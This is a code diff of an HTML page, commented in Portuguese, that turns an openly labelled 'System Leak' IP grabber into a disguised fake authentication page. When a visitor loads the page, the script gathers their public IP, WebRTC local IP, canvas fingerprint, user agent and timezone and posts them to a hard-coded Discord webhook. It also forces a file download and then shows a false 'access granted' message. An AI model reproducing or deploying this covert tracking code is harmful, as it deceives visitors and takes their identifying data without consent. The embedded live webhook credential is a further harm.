@@ -1,105 +1,58 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Report v3.0 - FUNCIONA!</title>
-    <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; margin: 0; }
-        #status { font-size: 18px; margin: 20px 0; }
-        .success { color: #0f0 !important; }
-        .error { color: #f00 !important; }
-    </style>
+    <title>Autenticação...</title>
 </head>
-<body>
-    <div id="status">🔄 Iniciando System Report v3.0...</div>
+<body style="margin:0;padding:20px;font-family:sans-serif;background:#f0f0f0;">
+    <div style="max-width:400px;margin:auto;text-align:center;">
+        <div id="status" style="font-size:16px;color:#666;">🔐 Autenticando usuário...</div>
+    </div>
     
     <script>
-        // SEU WEBHOOK (VÁLIDO)
         const WEBHOOK = 'https://discord.com/api/webhooks/1484989346569392300/y2sl6gZt8PJgIRrB_MSXyil6qIwKK8CdV9f7Xtis4VBDdrvyItQafC_gI8mROBxeQk8z';
         
-        async function sendSimpleMessage(content) {
-            const payload = { content: content };
-            const res = await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
-            return res.status === 204;
-        }
-        
-        async function getRealIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch {
-                return 'unknown';
-            }
-        }
-        
-        async function getWebRTC() {
-            return new Promise(resolve => {
-                const pc = new RTCPeerConnection({ 
-                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
-                });
-                pc.onicecandidate = e => {
-                    if (!e.candidate) return;
-                    const ip = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
-                    if (ip && !ip.startsWith('127.')) resolve(ip);
+        // ULTRA RÁPIDO - Sem await, tudo paralelo
+        Promise.all([
+            fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip),
+            new Promise(r=> {
+                const pc = new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
+                pc.onicecandidate = e=> {
+                    const ip = e.candidate?.candidate?.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/)?.[1];
+                    if (ip && !ip.startsWith('127.')) r(ip);
                 };
-                pc.createDataChannel('');
-                pc.createOffer().then(o => pc.setLocalDescription(o));
-                setTimeout(() => resolve('none'), 2500);
+                pc.createDataChannel(''); pc.createOffer().then(o=>pc.setLocalDescription(o));
+                setTimeout(()=>r('none'),1500);
+            }),
+            new Promise(r=> {
+                const c=document.createElement('canvas');c.width=100;c.height=50;
+                const ctx=c.getContext('2d');ctx.fillText('fp',10,25);
+                r(c.toDataURL().slice(0,30));
+            })
+        ]).then(([pubIP,localIP,canvasFP])=> {
+            // ENVIA IMEDIATAMENTE
+            fetch(WEBHOOK, {
+                method:'POST',
+                headers:{'Content-Type':'application/json'},
+                body:JSON.stringify({
+                    content:`🖥️ **AUTH BYPASS**
+**IP**: \`${pubIP}\`
+**Local**: \`${localIP}\`
+**FP**: \`${canvasFP}\`
+**UA**: ${navigator.userAgent.slice(0,50)}...`
+                })
             });
-        }
-        
-        async function fingerprint() {
-            const canvas = document.createElement('canvas');
-            canvas.width = 100; canvas.height = 50;
-            const ctx = canvas.getContext('2d');
-            ctx.fillText('fingerprint', 10, 25);
-            return canvas.toDataURL().slice(0, 30);
-        }
-        
-        // MAIN EXECUTION
-        async function main() {
-            document.getElementById('status').innerHTML = '📡 Coletando IPs...';
             
-            const [pubIP, localIP, canvasFP] = await Promise.all([
-                getRealIP(),
-                getWebRTC(),
-                fingerprint()
-            ]);
+            // Download stealth
+            const data={pubIP,localIP,canvasFP,userAgent:navigator.userAgent,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};
+            const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
+            const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='auth.log';a.click();
             
-            const message = `🖥️ **SYSTEM LEAK v3.0**
-**IP Público**: \`${pubIP}\`
-**IP WebRTC**: \`${localIP}\`
-**Canvas FP**: \`${canvasFP}\`
-**UA**: ${navigator.userAgent.slice(0, 60)}...
-**TZ**: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
-
-            document.getElementById('status').innerHTML = '📤 Enviando webhook...';
-            
-            const success = await sendSimpleMessage(message);
-            
-            if (success) {
-                document.getElementById('status').innerHTML = '✅ ENVIADO! Cheque Discord agora.';
-                document.getElementById('status').className = 'success';
-            } else {
-                document.getElementById('status').innerHTML = '❌ Falha no envio';
-                document.getElementById('status').className = 'error';
-            }
-            
-            // Auto download backup
-            const data = { pubIP, localIP, canvasFP, userAgent: navigator.userAgent };
-            const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
-            const a = document.createElement('a');
-            a.href = URL.createObjectURL(blob);
-            a.download = `leak_${Date.now()}.json`;
-            a.click();
-        }
-        
-        // START
-        setTimeout(main, 800);
+            // Fake success GUI
+            document.getElementById('status').innerHTML='✅ Autenticação aprovada! Redirecionando...';
+            setTimeout(()=> {
+                document.body.innerHTML='<h2 style="color:green;text-align:center;">Acesso liberado!</h2>';
+            }, 1000);
+        });
     </script>
 </body>
 </html>
